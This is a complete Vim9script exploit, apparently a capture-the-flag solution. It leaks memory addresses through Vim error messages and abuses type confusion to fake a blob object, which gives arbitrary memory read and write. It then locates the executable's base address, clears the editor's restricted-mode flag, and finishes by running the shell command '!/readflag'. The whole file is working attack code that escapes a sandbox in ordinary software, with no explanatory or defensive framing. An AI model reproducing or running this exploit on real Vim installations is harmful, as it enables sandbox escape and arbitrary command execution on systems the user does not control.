vim9script

def LeakObjPtr(obj: any): number
	var x = []
	try
		x[obj]
	catch /E684/
		var leak_str: string = v:exception
		var leak: number = str2nr(leak_str[35 : ])
		return leak
	endtry
	return -1
enddef

def LeakBlobDataPtr(obj: blob): number
	var high: number = LeakObjPtr("") >> 32

	var hook: number = obj
	hook += 0x10
	var low: number = and(len(hook), 0xffffffff)
	hook -= 0x10

	return or(high << 32, low)
enddef

def SetBlobDataPtr(obj: blob, addr: number)
	for i in range(8)
		obj[0x10 + i] = and(addr >> (i << 3), 0xff)
	endfor
enddef
def GetQWORD(fake_obj: blob, hook: any, where: number): number
	# hook must be `any` type because:
	# if we declare it as a number, we will not be able to index it
	# if we declare it as a blob, we won't be able to call it with the
	# broken object, because it is declared as a number
	SetBlobDataPtr(fake_obj, where)
	var res: number = 0
	for i in range(8)
		res += hook[i] << (i << 3)
	endfor
	return res
enddef
def SetByte(fake_obj: blob, hook: any, where: number, what: number)
	SetBlobDataPtr(fake_obj, where)
	hook[0] = what
enddef

def Pwn()
	var target: blob = 0z4141414141414141
	var fake_blob: blob
	# stupid endianess
	fake_blob += 0z4141414142424242  # len, maxlen
	fake_blob += 0z0100000064000000  # itemsize, growsize
	fake_blob += 0z4343434343434343  # data
	fake_blob += 0zff00000000000000  # refcount, lock


	var target_ptr: number = LeakObjPtr(target)
	var fake_blob_data_ptr: number = LeakBlobDataPtr(fake_blob)
	echo printf("target ---> %#018lx\n", target_ptr)
	echo printf("data   ---> %#018lx\n", fake_blob_data_ptr)

	var hook: number = target
	hook += fake_blob_data_ptr - target_ptr
	if len(hook) != 0x41414141
		echo "NO OBJ CORRUPTION"
		return
	endif

	var off: number = 0x20
	var exe: number = -1
	while true
		var maybe_exe = GetQWORD(fake_blob, hook, fake_blob_data_ptr + off)
		if maybe_exe >> 44 == 5 || maybe_exe >> 44 == 6
			if and(maybe_exe, 0xfff) == 0x3a0
				var check = GetQWORD(fake_blob, hook, maybe_exe)
				if check == 0x10000000000002
					exe = maybe_exe - 0x3af3a0
					break
				endif
			endif
		endif
		off += 0x8
	endwhile

	echo printf("exe    ---> %#018lx\n", exe)

	var restricted_ptr: number = exe + 0x3bb238
	SetByte(fake_blob, hook, restricted_ptr, 0)

	# I'm not sure why it doesn't crash there, it should free the
	# broken object that points to `restricted`, but for some reason
	# it ends up being a number and thus doesn't get freed.
enddef

Pwn()
!/readflag
